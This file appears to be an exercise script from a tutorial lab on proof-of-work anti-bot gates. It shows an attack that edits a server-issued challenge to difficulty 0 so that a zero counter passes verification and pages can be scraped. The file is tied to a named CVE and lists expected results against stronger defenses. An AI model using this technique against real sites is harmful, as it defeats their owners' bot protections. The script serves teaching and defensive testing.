"""
Chapter 7 — Round 1 Attack (b): don't solve the puzzle, edit it

Objective: read the client side of the protocol and notice that the
challenge comes back to the server *from us*. Set "difficulty": 0 and
any counter is a valid solution, at zero CPU cost.

    challenge = GET /pow/challenge          # {"nonce": ..., "difficulty": 16, ...}
    challenge["difficulty"] = 0             # the whole attack
    POST /pow/verify {"challenge": challenge, "counter": 0}

This is CVE-2025-24369 in Anubis, found in January 2025.

Expected results:
  - DEFENSE_LEVEL=0     → 200/200 (no gate)
  - DEFENSE_LEVEL=1     → 200/200, 0 hashes computed
  - DEFENSE_LEVEL>=2    → 0/200, "challenge signature invalid (was it edited?)"

Run:
    python attacks/round1_forge_difficulty.py
"""

import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
from _common import PAGES, Tally, client, get_challenge, redeem, report, scrape  # noqa: E402


def run():
    """Run the attack; return its scoreboard row (used by tools/checkpoint.py)."""
    tally = Tally("round1_forge_difficulty")
    with client() as c:
        def forged_pass():
            challenge = get_challenge(c)
            if challenge is None:
                return False
            challenge["difficulty"] = 0
            ok, why = redeem(c, challenge, 0)
            if not ok:
                tally.note(f"verify refused: {why}")
            return ok

        scrape(c, tally, range(1, PAGES + 1), get_pass=forged_pass)
    return tally.result()


if __name__ == "__main__":
    print("=== Round 1b: forge difficulty 0 ===")
    report(run())
